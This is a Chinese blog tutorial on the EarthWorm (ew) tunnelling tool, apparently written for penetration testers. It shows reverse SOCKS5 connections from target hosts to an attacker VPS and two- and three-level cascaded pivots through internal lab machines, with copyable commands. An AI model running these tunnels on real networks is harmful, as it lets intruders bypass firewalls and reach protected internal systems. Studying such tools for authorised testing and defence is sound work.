**目录**

[ew的使用](#t0 "ew的使用")

[模式](#t1 "模式")

[常用参数](#t2 "常用参数")

[一级代理](#t3 "一级代理")

[二级代理](#t4 "二级代理")

[三级代理](#t5 "三级代理")

* * *

如果想跟我一起讨论，那快加入我的知识星球吧！ 

![](https://img-blog.csdnimg.cn/20210127095840307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

ew的使用
-----

ew 全称是EarchWorm，是一套轻量便携且功能强大的网络穿透工具，基于标准C开发，具有socks5代理、端口转发和端口映射三大功能，可在复杂网络环境下完成网络穿透，且支持全平台(Windows/Linux/Mac)。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。

介绍：[EarthWorm](http://rootkiter.com/EarthWorm/ "EarthWorm")

![](https://img-blog.csdnimg.cn/202101242018236.png)

### 模式

ew有六种模式，分别是：

*   ssocksd
*   rcsocks
*   rssocks
*   lcx\_slave
*   lcx\_listen
*   lcx\_tran

ssocksd是用于普通网络环境下的正向连接。

rcsocks 和 rssocks 用于反向连接。

lcx\_slave 、lcx\_listen 和 lcx\_tran 用于复杂网络环境的多级连接。

### 常用参数

*   \-l：指定要监听的本地端口
*   \-d：指定要反弹到的机器 ip
*   \-e：指定要反弹到的机器端口
*   \-f：指定要主动连接的机器 ip
*   \-g：指定要主动连接的机器端口
*   \-t：指定超时时长,默认为 1000

### 一级代理

**正向代理**

当目标机器有一个公网ip时，可以使用以下命令建立一个socks5的代理。

```
./ew -s ssocksd -l 1080
```


![](https://img-blog.csdnimg.cn/20210124203232894.png)

**反向代理**

如果目标主机没有公网ip，则我们可以使用反向代理。在我们公网VPS(1.1.1.1)上建立一个转接隧道，将VPS 1080端口[监听](https://so.csdn.net/so/search?q=%E7%9B%91%E5%90%AC&spm=1001.2101.3001.7020)的流量转发到888端口。然后目标机器主动连接我们VPS的888端口。然后我们就可以通过设置代理为VPS的1080端口建立一条通往目标主机内网的socks5隧道了。

```
VPS：./ew -s rcsocks -l 1080 -e 888      
目标机器：./ew -s rssocks -d 1.1.1.1 -e 888
```


![](https://img-blog.csdnimg.cn/20210124205545168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 二级代理

现在有这么一种情况。服务器A能出网，服务器B不能出网，但是服务器B可以访问服务器C也就是靶标。服务器A不能访问到服务器C靶标，但是能通服务器B。

*   VPS：1.1.1.1
*   服务器A(Linux)：192.168.10.136
*   服务器B(Windows)：192.168.10.128
*   靶标web系统：http://192.168.10.132

![](https://img-blog.csdnimg.cn/20210124204214656.png)

![](https://img-blog.csdnimg.cn/20210124211555533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

首先，在VPS上开启如下监听，将1080端口监听的流量都转发到本地的888端口

```
./ew -s lcx_listen -l 1080 -e 888
```


![](https://img-blog.csdnimg.cn/20210124204939271.png)

然后在服务器B上执行如下命令，监听本地的999端口

```
ew.exe -s ssocksd -l 999
```


![](https://img-blog.csdnimg.cn/20210124204926693.png)

最后再服务器A上执行如下命令，将VPS的888端口和服务器B的999端口连接起来

```
./ew -s lcx_slave -d 1.1.1.1 -e 888 -f 192.168.10.128 -g 999
```


![](https://img-blog.csdnimg.cn/20210124205055299.png)

以上命令都执行完之后，设置socks5代理为VPS的1080端口，即可成功访问靶标web系统。

![](https://img-blog.csdnimg.cn/20210124205301637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 三级代理

现在有这么一种情况。服务器A能出网，服务器B不能出网，服务器C也不能出网。服务器A只能访问服务器B。服务器B只能访问服务器A和服务器C。服务器C能访问服务器B，也能访问靶标。

*   VPS：1.1.1.1
*   服务器A(Linux)：192.168.10.136
*   服务器B(Windows)：192.168.10.128
*   服务器C(Linux)：192.168.10.129
*   靶标web系统：http://192.168.10.132

![](https://img-blog.csdnimg.cn/20210124204214656.png)

![](https://img-blog.csdnimg.cn/20210124211415736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

首先，在VPS上执行如下命令，将1080端口监听的流量都转发到本地的888端口

```
./ew -s rcsocks -l 1080 -e 888
```


![](https://img-blog.csdnimg.cn/20210124210659103.png)

然后在服务器A上执行如下命令，将VPS的888端口和内网主机B的999端口连接起来

```
./ew -s lcx_slave -d 1.1.1.1 -e 888 -f 192.168.10.128 -g 999
```


![](https://img-blog.csdnimg.cn/20210127125453854.png)

接着在服务器B上执行如下命令，将监听的999端口的流量都转发给本地的777端口

```
ew.exe -s lcx_listen -l 999 -e 777
```


![](https://img-blog.csdnimg.cn/20210124210914269.png)

最后再服务器C上执行如下命令，反弹流量到主机B的777端口

```
./ew -s rssocks -d 192.168.10.128 -e 777
```


![](https://img-blog.csdnimg.cn/20210124211115611.png)

以上命令都执行完之后，设置socks5代理为VPS的1080端口，即可成功访问靶标web系统。

![](https://img-blog.csdnimg.cn/20210124211327908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

  参考文章：[SOCKS代理-EarchWorm(ew)三级级联 - micr067 - 博客园](https://www.cnblogs.com/micr067/p/12266244.html "SOCKS代理-EarchWorm(ew)三级级联 - micr067 - 博客园")

文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)10949 人正在系统学习中